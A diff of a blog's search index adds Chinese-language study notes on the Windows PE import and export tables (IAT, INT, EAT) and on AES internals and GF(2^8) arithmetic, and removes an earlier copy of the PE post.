+<p>DLL加载方式有两种：<strong>显式链接（Explicit Linking）</strong> 和 <strong>隐式链接（Implicit Linking）</strong></p>
+<ul>
+<li>显示链接：程序在使用DLL时进行加载，使用完毕后释放内存</li>
+<li>隐式链接：程序在开始时即一同加载DLL，程序终止时再释放占用的内存</li>
+</ul>
+<p>IAT提供的机制与DLL的隐式链接有关</p>
+<p><strong>程序调用系统IAT表的时候具体实现过程：</strong></p>
+<p>假设我们程序中某处要用到MessageBoxA，那么这里会有两种形式，一种是先call到一个地址，这个地址中是一个jmp  [A]，A中存放着数据，数据内容就是我们的MessageBox的入口地址。另一种情况是直接calll到MessageBoxA的入口地址即  [A],[A]是A地址存放的数据，A中存放的数据是MessageBox的入口地址，之所以叫做表也是这个原因，因为程序要调用很多系统dll，如果我们的dll地址发生改变，要对每一处调用修改其调用地址是很麻烦的，如果有这样的表，我们将所有的函数调用的入口地址集中在一个集中的地址中，然后通过解析这个表方便我们进行修改，这样我们只要修改这个表所指的函数入口地址。</p>
+<p>我们在OD中选择call了MessageBox的一行，用view 运行文件的方法查看，可以看到这里并不是函数入口地址，而是一个dword的数，这个十六进制数加上基址假设叫做B，我们跳过去看B，看到B中的数据是一个ASCII码的内容，即字符串MessageBox，也就是说，Windows在运行程序，即在加载前通过内部实现，把我们的字符串MessageBox换为了MessageBox的入口地址，这样我们在call 【A】的时候就是跳转到了MessageBox的入口地址。</p>
+<p>下面引入一个结构体</p>
+<p><strong>IMAGE_IMPORT_DESCRIPTOR</strong></p>
+<p>该结构体位于 IMAGE_OPTIONAL_HEADER 的 IMAGE_DATA_DIRECTORY 中定位到第二个目录，即 IMAGE_DIRECTORY_ENTRY_IMPORT。该结构体保存了导入函数的 RVA 地址，通过该 RVA 地址可以定位到导入表的具体位置。</p>
+<p>每一个导入的 DLL 都有一个对应的 IMAGE_IMPORT_DESCRIPTOR，并且以数组的形式存放在文件中的,定义如下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"></span><br><span class="line">          DWORD Characteristics;         </span><br><span class="line"></span><br><span class="line">          DWORD OriginalFirstThunk;<span class="comment">//该字段指向导入名称表（INT），该RVA是一个IMAGE_THUNK_DATA结构体</span></span><br><span class="line"></span><br><span class="line">     &#125;;</span><br><span class="line"></span><br><span class="line">      DWORD TimeDateStamp;<span class="comment">//可以忽略，一般为0      </span></span><br><span class="line"></span><br><span class="line">      DWORD ForwarderChain;<span class="comment">//一般为0      </span></span><br><span class="line"></span><br><span class="line">      DWORD Name;<span class="comment">//指向DLL的名称的RVA地址            </span></span><br><span class="line"></span><br><span class="line">      DWORD FirstThunk;<span class="comment">//该字段包含导入地址表（IAT）的RVA，IAT是一个IMAGE_THUNK_DATA结构体数组</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
+<p>导入信息并不包含指定导入表的个数，而是以一个全为0的IMAGE_IMPORT_DESCRIPTOR 结构体作为结束标志。</p>
+<p>下面是IMAGE_THUNK_DATA 结构体的定义:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"></span><br><span class="line">           DWORD ForwarderString; <span class="comment">// 一个RVA地址，指向forwarder string </span></span><br><span class="line"></span><br><span class="line">           DWORD Function;        <span class="comment">// PDWORD，被导入的函数的入口地址</span></span><br><span class="line"></span><br><span class="line">           DWORD Ordinal;         <span class="comment">// 该函数的序数</span></span><br><span class="line"></span><br><span class="line">           DWORD AddressOfData;   <span class="comment">// 一个RVA地址，指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line"></span><br><span class="line">      &#125; u1;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
+<p>每一个 IMAGE_THUNK_DATA 对应一个 DLL 中的导入函数。与 IMAGE_IMPORT_DESCRIPTOR 类似，IMAGE_THUNK_DATA 在文件中也是一个数组，并以一个全为 “0” 的 IMAGE_THUNK_DATA 结束。</p>
+<p>当该结构体值的最高位为 0 时，表示函数以函数名字符串的方式导入，这时该 DWORD 的值表示一个 RVA，并指向一个 IMAGE_IMPORT_BY_NAME 结构体：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     WORD Hint;         <span class="comment">//该函数的导出序数</span></span><br><span class="line"></span><br><span class="line">     BYTE Name[<span class="number">1</span>];      <span class="comment">// 该函数的名字</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>
+<p>看起来可能有些绕，一会IAT一会INT的</p>
+<p>The difference between IAT and INT:</p>
+<p>IMAGE_IMPORT_DESCRIPTOR<code>结构体中的</code>OriginalFirstThunk<code>和</code>FirstThunk<code>都指向</code>IMAGE_THUNK_DATA结构体。</p>
+<p><strong>当文件在磁盘上时，两者指向的是同一个 <code>IMAGE_THUNK_DATA</code>，而当文件载入内存时 <code>OriginalFirstThunk</code> 中保存的仍然是指向函数的 RVA，而 <code>FirstThunk</code> 指向的内存变成了由装载器填充的导入函数地址，即 IAT。</strong></p>
+<p>Look at this pictures:)</p>
+<p><img src="https://i.loli.net/2021/04/23/6YTqlu2GR1S4WbK.png" alt="210.jpg"></p>
+<p>操作系统填充IAT大致流程如下：</p>
+<p> 1.找到导入表起始地址</p>
+<p> 2.找到第一个IID</p>
+<p> 3.根据IID的第四个字段确定dll库名称</p>
+<p> 4.根据IID的第五个字段确定IAT表地址</p>
+<p> 5.通过IAT字符串指针定位到目标函数名称。</p>
+<p> 6.用目标函数地址修改IAT的字符串指针。</p>
+<p> 7.修改下一处IAT</p>
+<p> 8.IAT项为0，修改完毕</p>
+<p> 9.找到下一个IID从第3步开始重复上面的操作。</p>
+<h2 id="What’s-EAT"><a href="#What’s-EAT" class="headerlink" title="What’s EAT"></a><strong>What’s EAT</strong></h2><p>与INT相对应，EAT（Exoprt Adress Table）顾名思义，导出表。</p>
+<p> EAT是一种核心机制，使不同的应用程序可以调用库文件中提供的函数，只有通过EAT才能准确求得从相应库中到处函数的起始地址。PE文件内的IMAGE_EXPORT_DIRECTORY保存着导出信息，<strong>且PE文件中仅有一个用来说明EAT的IMAGE_EXPORT_DIRECTORY结构体。</strong>（这点对比IAT：IAT的 IMAGE_IMPORT_DESCRIPTOR结构体以数组形式存在，且有多个成员，这主要是因为PE文件可以同时导入多个库。</p>
+<p>EAT结构体位于PE头中，IMAGE_OPTIONAL_HEADER32.DataDirectory[0]</p>
+<p>  IMAGE_EXPORT_DIRECTORY结构：</p>
+<p>依旧先放结构体定义</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">	DWORD Characteristics;			<span class="comment">//保留 总是定义为0</span></span><br><span class="line">	DWORD TimeDateStamp;			<span class="comment">//文件生成时间</span></span><br><span class="line">	WORD  MajorVersion;				<span class="comment">//主版本号 一般不赋值</span></span><br><span class="line">	WORD  MinorVersion;				<span class="comment">//次版本号 一般不赋值</span></span><br><span class="line">	DWORD Name;						<span class="comment">//模块的真实名称</span></span><br><span class="line">	DWORD Base;						<span class="comment">//索引基数 加上序数就是函数地址数组的索引值</span></span><br><span class="line">	DWORD NumberOfFunctions;		<span class="comment">//地址表中个数</span></span><br><span class="line">	DWORD NumberOfNames;			<span class="comment">//名称表的个数</span></span><br><span class="line">	DWORD AddressOfFunctions;		<span class="comment">//输出函数地址的RVA</span></span><br><span class="line">	DWORD AddressOfNames;			<span class="comment">//输出函数名字的RVA</span></span><br><span class="line">	DWORD AddressOfNameOrdinals;	<span class="comment">//输出函数序号的RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORYM, *pIMAGE_EXPORT_DIRECTORY; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/04/23/HaVkY3scUndb7fu.png" alt="EXP.jpg"></p>
+<p>Demo: kernel32.dll</p>
+<p><img src="https://i.loli.net/2021/04/23/jnRY8mx1zyHsTWw.png" alt="209.jpg"></p>
+<p>从库中获得函数地址的API为GetProcAddress()函数，该API引用EAT来获取指定API的地址。其过程大致如下：</p>
+<ol>
+<li>利用AddressOfName成员转到“函数名称数组”</li>
+<li>“函数名称数组”中存储着字符串地址，通过比较（strcmp）字符串，查找指定的函数名称（此时数组的索引称为name_index）</li>
+<li>利用AddressOfNameOrdinals成员，转到ordinal数组</li>
+<li>在ordinal数组中通过name_index查找相应ordinal值</li>
+<li>利用AddressOfFunctionis成员转到“函数地址数组”（EAT）</li>
+<li>在“函数地址数组”中将刚刚求得的ordinal用作数组索引，获得指定函数的起始地址</li>
+</ol>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><p>PE文件是逆向的一个基础，了解PE文件的结构和动态连接的过程有利于我们更好地理解高级调试。</p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>windows</tag>
+        <tag>PE文件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>AES分析</title>
+    <url>/2021/05/17/cryp_AES/</url>
+    <content><![CDATA[<h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>Advanced Encryption Standard（AES），高级加密标准，是典型的块加密，被设计来取代 DES，由 Joan Daemen 和 Vincent Rijmen 所设计。其基本信息如下</p>
+<ul>
+<li>输入：128 比特。</li>
+<li>输出：128 比特。</li>
+<li>SPN 网络结构。</li>
+<li>过程主要包括<strong>字节替代</strong>、<strong>行移位</strong>、<strong>列混淆</strong>和<strong>轮密钥加</strong></li>
+</ul>
+<p>其迭代轮数与密钥长度有关系，如下</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>密钥长度（比特）</th>
+<th>迭代轮数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>128</td>
+<td>10</td>
+</tr>
+<tr>
+<td>192</td>
+<td>12</td>
+</tr>
+<tr>
+<td>256</td>
+<td>14</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在 AES 加解密过程中，每一块都是 128 比特，所以我们这里明确一些基本概念。</p>
+<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_data_unit.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_data_unit.png" alt="img"></a></p>
+<p>在 AES 中，块与 State 之间的转换过程如下</p>
+<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_block2state.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_block2state.png" alt="img"></a></p>
+<p>所以，可以看出，每一个 block 中的字节是按照列排列进入到状态数组的。</p>
+<p>而对于明文来说，一般我们会选择使用其十六进制进行编码。</p>
+<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_plain2state.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_plain2state.png" alt="img"></a></p>
+<h3 id="加解密过程"><a href="#加解密过程" class="headerlink" title="加解密过程"></a>加解密过程</h3><p>这里给个看雪上比较好的 <a href="http://bbs.pediy.com/thread-90722.htm">图例</a> ，以便于介绍基本的流程，每一轮主要包括</p>
+<ul>
+<li>轮密钥加，AddRoundKey</li>
+<li>字节替换，SubBytes</li>
+<li>行移位，ShiftRows</li>
+<li>列混淆，MixColumns</li>
+</ul>
+<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_details.jpg"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_details.jpg" alt="img"></a></p>
+<p>上面的列混淆的矩阵乘法等号左边的列向量应该在右边。</p>
+<p>这里再给一张其加解密的全图，其解密算法的正确性很显然。</p>
+<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_enc_dec.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_enc_dec.png" alt="img"></a></p>
+<p>我们这里重点关注一下以下。</p>
+<h4 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h4><p>在字节替换的背后，其实是有对应的数学规则来定义对应的替换表的，如下</p>
+<p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_subbytes.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_subbytes.png" alt="img"></a></p>
+<script type="math/tex; mode=display">
+这里的运算均定义GF(2^8)内</script><h4 id="列混淆"><a href="#列混淆" class="headerlink" title="列混淆"></a>列混淆</h4><script type="math/tex; mode=display">
+这里的运算也是定义在 GF(2^8) 上，使用的模多项式为 x^8+x^4+x^3+1。</script><h4 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h4><p><a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/crypto/blockcipher/figure/aes_key_expansion.png"><img src="https://github.com/ctf-wiki/ctf-wiki/raw/master/docs/zh/docs/crypto/blockcipher/figure/aes_key_expansion.png" alt="img"></a></p>
+<h2 id="等价解密算法"><a href="#等价解密算法" class="headerlink" title="等价解密算法"></a>等价解密算法</h2><p>简单分析一下，我们可以发现</p>
+<ul>
+<li>交换逆向行移位和逆向字节代替并不影响结果。</li>
+<li>交换轮密钥加和逆向列混淆并不影响结果，关键在于<ul>
+<li>首先可以把异或看成域上的多项式加法</li>
+<li>然后多项式中乘法对加法具有分配率。</li>
+</ul>
+</li>
+</ul>
+<h2 id="GF-2-8-上的四则运算"><a href="#GF-2-8-上的四则运算" class="headerlink" title="GF(2^8)上的四则运算"></a>GF(2^8)上的四则运算</h2><p>加减法：</p>
+<script type="math/tex; mode=display">
+在GF(2^8)上的加法定义为二进制多项式加法，且其系数模2</script><p>Demo:  57+83=D4</p>
+<script type="math/tex; mode=display">
+(x^6+x^4+x^2+x+1)+(x^7+x+1)=x^7+x^6+ x^4+ x^2 (mod m(x))</script><p>乘除法：</p>
+<script type="math/tex; mode=display">
+在GF(2^8)中定义的二进制乘积模一个次数为8的不可约多项式</script><script type="math/tex; mode=display">
+m(x)= x^8+x^4+x^3+x+1</script><p>Demo: 57*83=C1</p>
+<script type="math/tex; mode=display">
+ (x^6+x^4+x^2+x+1)·(x^7+x+1)=x^7+x^6+1(mod m(x))</script><p>列混合：</p>
+<p>列混合操作等价于以下矩阵乘法：</p>
+<p><img src="https://i.loli.net/2021/05/17/9h4RbYwG7LoDTvF.png" alt="AES.png"></p>
+<script type="math/tex; mode=display">
+b3​x3+b2​x2+b1​x+b0​=(a3​x3+a2​x2+a1​x+a0​)({03}x3+{01}x2+{01}x+{02})</script><script type="math/tex; mode=display">
+=(a3​∗03)x6+(a3​∗01+a2​∗03)x5+(a3​∗01+a2​∗01+a1​∗03)x4+(a3​∗02+a2​∗01+a1​∗01+a0​∗03)x3+(a2​∗02+a1​∗01+a0​∗01)x2+(a1​∗02+a0​∗01)x+a0​∗02</script><script type="math/tex; mode=display">
+=(a3​∗02+a2​∗01+a1​∗01+a0​∗03)x3+(a3​∗03+a2​∗02+a1​∗01+a0​∗01)x2+(a3​∗01+a2​∗03+a1​∗02+a0​∗01)x+(a3​∗01+a2​∗01+a1​∗03+a0​∗02)</script><p>最终写为矩阵形式即如上图</p>
+]]></content>
+      <categories>
+        <category>cryptography</category>
+      </categories>
+      <tags>
+        <tag>AES</tag>
       </tags>
   </entry>
   <entry>
@@ -717,169 +1031,6 @@ S_{1}(011011)=0101</script><p>对于这8个 Bi，通过 SiSi 全部计算完成�
       </tags>
   </entry>
   <entry>
-    <title>Windows_PE文件格式</title>
-    <url>/2021/04/22/Windows_PE%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h1 id="Windows-PE文件格式"><a href="#Windows-PE文件格式" class="headerlink" title="Windows_PE文件格式"></a>Windows_PE文件格式</h1><p>​    PE文件格式是理解Windows操作系统进程、内存、动态链接库加载的基础，本文结合逆向课所学和查询的资料简单做个总结。</p>
-<h2 id="1-PE文件基本介绍"><a href="#1-PE文件基本介绍" class="headerlink" title="1.PE文件基本介绍"></a><strong>1.PE文件基本介绍</strong></h2><p>PE文件是Windows操作系统下使用的一种可执行文件，由COFF（UNIX平台下的通用对象文件格式）格式文件发展而来。32位成为PE32，64位称为PE+或PE32+。</p>
-<h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a><strong>基本结构</strong></h2><p> 从DOS头到节区头是PE头部分，其下的节区合称为PE体。</p>
-<ol>
-<li><p><strong>DOS头</strong></p>
-<p>主要为现代PE文件可以对早期的DOS文件进行良好兼容存在，其结构体为IMAGE_DOS_HEADER。</p>
-<p>大小为64字节，其中2个重要的成员分别是：</p>
-<ul>
-<li>e_magic:DOS签名（4D5A，MZ）</li>
-<li>e_lfanew：指示NT头的偏移（文件不同，值不同）</li>
-</ul>
-</li>
-<li><p><strong>DOS存根</strong></p>
-<p>stub，位于DOS头下方，可选，大小不固定，由代码与数据混合组成。</p>
-</li>
-<li><p><strong>NT头</strong></p>
-<p>结构体为IMAGE_NT_HEADERS，大小为F8，由3个成员组成：</p>
-<ul>
-<li>签名结构体，值为50450000h（“PE”00）</li>
-<li>文件头，表现文件大致属性，结构体为IMAGE_FILE_HEADER，重要成员有4个：<ul>
-<li>Machine：每个CPU都拥有的唯一的Machine码，兼容32位Intel x86芯片的Machine码为14C；</li>
-<li>NumberOfSections：指出文件中存在的节区数量；</li>
-<li>SizeOfOptionalHeader：指出结构体IMAGE_OPTIONAL_HEADER32（32位系统）的长度</li>
-<li>Characteristics：标识文件属性，文件是否是可运行形态、是否为DLL等，以bit OR形式进行组合</li>
-</ul>
-</li>
-<li>可选头，结构体为IMAGE_OPTIONAL_HEADER32，重要成员有9个：<ul>
-<li>Magic：IMAGE_OPTIONAL_HEADER32为10B，IMAGE_OPTIONAL_HEADER64为20B</li>
-<li><strong>AddressOfEntryPoint</strong>：持有EP的RVA值，指出程序最先执行的代码起始地址</li>
-<li>ImageBase：指出文件的优先装入地址（32位进程虚拟内存范围为：0～7FFFFFFF）</li>
-<li>SectionAlignment,FileAlignment：前者制定了节区在内存中的最小单位，后者制定了节区在磁盘文件中的最小单位</li>
-<li>SizeOfImage：指定了PE Image在虚拟内存中所占空间的大小</li>
-<li>SizeOfHeaders：指出整个PE头的大小</li>
-<li>Subsystem：区分系统驱动文件和普通可执行文件</li>
-<li>NumberOfRvaAndSize：指定DataDirectory数组的个数</li>
-<li><strong>DataDirectory</strong>：<strong>由IMAGE_DATA_DIRECTORY结构体组成的数组</strong></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>节区头</strong></p>
-<p>节区头定义了各节区的属性。PE文件中code、data、resource等按照属性储存在不同的节区。好处是可以保证程序的安全性，将代码和数据分隔开，每个节区设计不同的访问权限。</p>
-<p>| 类别     | 访问权限权限     |<br>| ———— | ———————— |<br>| code     | 执行、读取权限   |<br>| data     | 非执行、读写权限 |<br>| resource | 非执行、读取权限 |</p>
-<p>节区头中定义了各节区的属性，包括不同的特性、访问权限等，结构体为IMAGE_SECTION_HEADER，重要成员有5个：</p>
-<ul>
-<li>VirtualSize：内存中节区所占大小</li>
-<li>VirtualAddress：内存中节区起始地址（RVA）</li>
-<li>SizeOfRawData：磁盘文件中节区所占大小</li>
-<li>Charateristics：节区属性（bit OR）</li>
-</ul>
-</li>
-</ol>
-<h2 id="内存映射-RVA-to-RAW"><a href="#内存映射-RVA-to-RAW" class="headerlink" title="内存映射(RVA_to_RAW)"></a><strong>内存映射(RVA_to_RAW)</strong></h2><p>左边文件中使用偏移（offset），内存中使用VA（Virtual Address，虚拟地址）来表示位置。文件加载到内存时，情况就会发生变化（节区大小、位置等）。文件的内容一般可分为代码（.text）、数据（.data）、资源（.rsrc）节，分别保存。PE头与各节区的尾部存在一个区域，成为NULL填充。文件/内存中节区的起始位置应该在各文件/内存最小单位的倍数上，空白区域使用NULL进行填充（如下图所示）。</p>
-<p><img src="https://i.loli.net/2021/04/22/tuVd4UL9BONoP2K.png" alt="102.jpg"></p>
-<p>VA: Virtual Address 进程虚拟内存绝对地址</p>
-<p>RVA: Relative Virtual Address 相对虚拟地址，指从某个基准位置开始的相对地址</p>
-<p>ImageBase: PE文件的优先装载地址</p>
-<p>转换关系如下：</p>
-<script type="math/tex; mode=display">
-RVA+ImageBase=VA</script><p><strong>Why use VA and RVA?</strong></p>
-<p>PE头内部信息大多以RVA形式存在。PE文件（主要是DLL）加载到进程虚拟内存的特定位置时，该位置可能已经加载了其他PE文件。此时必须通过重定位将其加载到其他空白位置，若PE头用的是VA，则会造成无法正常访问。因此使用RVA来定位信息，即使发生重定位，只要相对于基准的相对地址没有发生变化，就能正常访问到指定信息不会发生问题。</p>
-<p>Demo:</p>
-<p>If RVA=5000,  File Offset=?</p>
-<p>①首先查找RVA对应所在的节区</p>
-<p>→位于第一个节区(.text)  图中ImageBase(01000000)</p>
-<p>②计算公式</p>
-<p>→</p>
-<script type="math/tex; mode=display">
-RAW=RVA-VirtualAddress+PointerToRawData\\
-=5000-1000+400=4400</script><h2 id="2-What’s-IAT"><a href="#2-What’s-IAT" class="headerlink" title="2.What’s IAT"></a><strong>2.What’s IAT</strong></h2><p>IAT: Import Address Table 导入地址表。</p>
-<p>这个表保存了与windows操作系统核心进程、内存、DLL结构等相关的信息。只要了理解了IAT，就掌握了Windows操作系统的根基。IAT是一种表格，用来记录程序正在使用哪些库中的哪些函数。</p>
-<p>先了解一下Windows的DDL</p>
-<p>DLL：Dynamic Linked Library 动态链接库</p>
-<ol>
-<li>不把函数库包含进应用程序中，单独组成DLL文件，在需要使用时再进行调用。</li>
-<li>使用内存映射技术将加载后的DLL代码、资源在多个进程中实现共享。</li>
-<li>在对函数库进行更新时，只更新DLL文件，简单易行</li>
-</ol>
-<p>DLL加载方式有两种：<strong>显式链接（Explicit Linking）</strong> 和 <strong>隐式链接（Implicit Linking）</strong></p>
-<ul>
-<li>显示链接：程序在使用DLL时进行加载，使用完毕后释放内存</li>
-<li>隐式链接：程序在开始时即一同加载DLL，程序终止时再释放占用的内存</li>
-</ul>
-<p>IAT提供的机制与DLL的隐式链接有关</p>
-<p><strong>程序调用系统IAT表的时候具体实现过程：</strong></p>
-<p>假设我们程序中某处要用到MessageBoxA，那么这里会有两种形式，一种是先call到一个地址，这个地址中是一个jmp  [A]，A中存放着数据，数据内容就是我们的MessageBox的入口地址。另一种情况是直接calll到MessageBoxA的入口地址即  [A],[A]是A地址存放的数据，A中存放的数据是MessageBox的入口地址，之所以叫做表也是这个原因，因为程序要调用很多系统dll，如果我们的dll地址发生改变，要对每一处调用修改其调用地址是很麻烦的，如果有这样的表，我们将所有的函数调用的入口地址集中在一个集中的地址中，然后通过解析这个表方便我们进行修改，这样我们只要修改这个表所指的函数入口地址。</p>
-<p>我们在OD中选择call了MessageBox的一行，用view 运行文件的方法查看，可以看到这里并不是函数入口地址，而是一个dword的数，这个十六进制数加上基址假设叫做B，我们跳过去看B，看到B中的数据是一个ASCII码的内容，即字符串MessageBox，也就是说，Windows在运行程序，即在加载前通过内部实现，把我们的字符串MessageBox换为了MessageBox的入口地址，这样我们在call 【A】的时候就是跳转到了MessageBox的入口地址。</p>
-<p>下面引入一个结构体</p>
-<p><strong>IMAGE_IMPORT_DESCRIPTOR</strong></p>
-<p>该结构体位于 IMAGE_OPTIONAL_HEADER 的 IMAGE_DATA_DIRECTORY 中定位到第二个目录，即 IMAGE_DIRECTORY_ENTRY_IMPORT。该结构体保存了导入函数的 RVA 地址，通过该 RVA 地址可以定位到导入表的具体位置。</p>
-<p>每一个导入的 DLL 都有一个对应的 IMAGE_IMPORT_DESCRIPTOR，并且以数组的形式存放在文件中的,定义如下</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"></span><br><span class="line">          DWORD Characteristics;         </span><br><span class="line"></span><br><span class="line">          DWORD OriginalFirstThunk;<span class="comment">//该字段指向导入名称表（INT），该RVA是一个IMAGE_THUNK_DATA结构体</span></span><br><span class="line"></span><br><span class="line">     &#125;;</span><br><span class="line"></span><br><span class="line">      DWORD TimeDateStamp;<span class="comment">//可以忽略，一般为0      </span></span><br><span class="line"></span><br><span class="line">      DWORD ForwarderChain;<span class="comment">//一般为0      </span></span><br><span class="line"></span><br><span class="line">      DWORD Name;<span class="comment">//指向DLL的名称的RVA地址            </span></span><br><span class="line"></span><br><span class="line">      DWORD FirstThunk;<span class="comment">//该字段包含导入地址表（IAT）的RVA，IAT是一个IMAGE_THUNK_DATA结构体数组</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
-<p>导入信息并不包含指定导入表的个数，而是以一个全为0的IMAGE_IMPORT_DESCRIPTOR 结构体作为结束标志。</p>
-<p>下面是IMAGE_THUNK_DATA 结构体的定义:</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"></span><br><span class="line">           DWORD ForwarderString; <span class="comment">// 一个RVA地址，指向forwarder string </span></span><br><span class="line"></span><br><span class="line">           DWORD Function;        <span class="comment">// PDWORD，被导入的函数的入口地址</span></span><br><span class="line"></span><br><span class="line">           DWORD Ordinal;         <span class="comment">// 该函数的序数</span></span><br><span class="line"></span><br><span class="line">           DWORD AddressOfData;   <span class="comment">// 一个RVA地址，指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line"></span><br><span class="line">      &#125; u1;</span><br><span class="line"></span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
-<p>每一个 IMAGE_THUNK_DATA 对应一个 DLL 中的导入函数。与 IMAGE_IMPORT_DESCRIPTOR 类似，IMAGE_THUNK_DATA 在文件中也是一个数组，并以一个全为 “0” 的 IMAGE_THUNK_DATA 结束。</p>
-<p>当该结构体值的最高位为 0 时，表示函数以函数名字符串的方式导入，这时该 DWORD 的值表示一个 RVA，并指向一个 IMAGE_IMPORT_BY_NAME 结构体：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line"></span><br><span class="line">     WORD Hint;         <span class="comment">//该函数的导出序数</span></span><br><span class="line"></span><br><span class="line">     BYTE Name[<span class="number">1</span>];      <span class="comment">// 该函数的名字</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>
-<p>看起来可能有些绕，一会IAT一会INT的</p>
-<p>The difference between IAT and INT:</p>
-<p>IMAGE_IMPORT_DESCRIPTOR<code>结构体中的</code>OriginalFirstThunk<code>和</code>FirstThunk<code>都指向</code>IMAGE_THUNK_DATA结构体。</p>
-<p><strong>当文件在磁盘上时，两者指向的是同一个 <code>IMAGE_THUNK_DATA</code>，而当文件载入内存时 <code>OriginalFirstThunk</code> 中保存的仍然是指向函数的 RVA，而 <code>FirstThunk</code> 指向的内存变成了由装载器填充的导入函数地址，即 IAT。</strong></p>
-<p>Look at this pictures:)</p>
-<p><img src="https://i.loli.net/2021/04/23/6YTqlu2GR1S4WbK.png" alt="210.jpg"></p>
-<p>操作系统填充IAT大致流程如下：</p>
-<p> 1.找到导入表起始地址</p>
-<p> 2.找到第一个IID</p>
-<p> 3.根据IID的第四个字段确定dll库名称</p>
-<p> 4.根据IID的第五个字段确定IAT表地址</p>
-<p> 5.通过IAT字符串指针定位到目标函数名称。</p>
-<p> 6.用目标函数地址修改IAT的字符串指针。</p>
-<p> 7.修改下一处IAT</p>
-<p> 8.IAT项为0，修改完毕</p>
-<p> 9.找到下一个IID从第3步开始重复上面的操作。</p>
